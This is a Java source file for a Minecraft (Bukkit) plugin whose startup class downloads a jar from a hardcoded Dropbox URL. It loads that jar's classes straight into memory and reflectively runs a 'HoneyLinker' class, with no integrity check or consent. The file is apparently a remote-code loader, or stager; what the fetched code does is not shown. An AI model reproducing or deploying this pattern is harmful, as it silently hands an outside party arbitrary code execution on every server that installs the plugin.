package me.alek.honey;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public final class Boot extends JavaPlugin {

    private static Plugin plugin;

    @Override
    public void onEnable() {
        plugin = this;
        setup(getClassLoader());
    }

    public static class JavaPluginLoader extends URLClassLoader {

        private final Map<String, byte[]> jarContent;

        public JavaPluginLoader(ClassLoader parent, Map<String, byte[]> jarContent) {
            super(new URL[]{}, parent);
            this.jarContent = jarContent;
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            if (jarContent.containsKey(name)) {

                byte[] classContent = jarContent.get(name);
                try {
                    return defineClass(name, classContent, 0, classContent.length);

                } catch (Exception ex) {
                    plugin.getLogger().severe("Error occurred when defining class for classloader: " + name + ", " + classContent.length + " bytes");
                    ex.printStackTrace();
                }
            }
            return super.findClass(name);
        }
    }

    private static final String LINKER_CLASS = "me.alek.honey.linker.HoneyLinker";

    public static void setup(ClassLoader classLoader) {
        try {
            URL url = new URL("https://www.dropbox.com/scl/fi/84j4dvv5kh82ns6ajq4a9/Honey-Linker-2.0.jar?rlkey=yqclr2croc40b6m0q3mkvhktt&dl=1");
            InputStream stream = url.openStream();

            JavaPluginLoader loader = load(stream, classLoader);
            invokeLinkerClass(loader);

        } catch (Exception ex) {
            plugin.getLogger().severe("Error occurred when downloading linker jar.");

            ex.printStackTrace();
        }
    }

    public static JavaPluginLoader load(InputStream stream, ClassLoader currentLoader) {
        Map<String, byte[]> classes = loadClasses(stream);

        return new JavaPluginLoader(currentLoader, classes);
    }

    public static void invokeLinkerClass(JavaPluginLoader loader) {
        try {
            Class<?> mainClass = loader.loadClass(LINKER_CLASS);

            Object main = mainClass.getDeclaredConstructor(Plugin.class, UUID.class).newInstance(plugin, UUID.randomUUID());
            mainClass.getMethod("execute").invoke(main);

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static Map<String, byte[]> loadClasses(InputStream stream) {
        Map<String, byte[]> classBytesMap = new HashMap<>();

        try {

            try (ZipInputStream inputStream = new ZipInputStream(stream)) {

                ZipEntry entry;
                while ((entry = inputStream.getNextEntry()) != null) {
                    if (entry.isDirectory() || !entry.getName().endsWith(".class")) continue;

                    String className = entry.getName().replace('/', '.').replace(".class", "");

                    classBytesMap.put(className, loadClassData(inputStream));
                    inputStream.closeEntry();
                }
            }

        } catch (Exception ex) {
            plugin.getLogger().severe("Error occurred when loading classes from stream!");
            ex.printStackTrace();
        }

        return classBytesMap;
    }

    public static byte[] loadClassData(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        byte[] buffer = new byte[1024];
        int len;
        while ((len = inputStream.read(buffer)) != -1) {
            byteArrayOutputStream.write(buffer, 0, len);
        }
        return byteArrayOutputStream.toByteArray();
    }
}
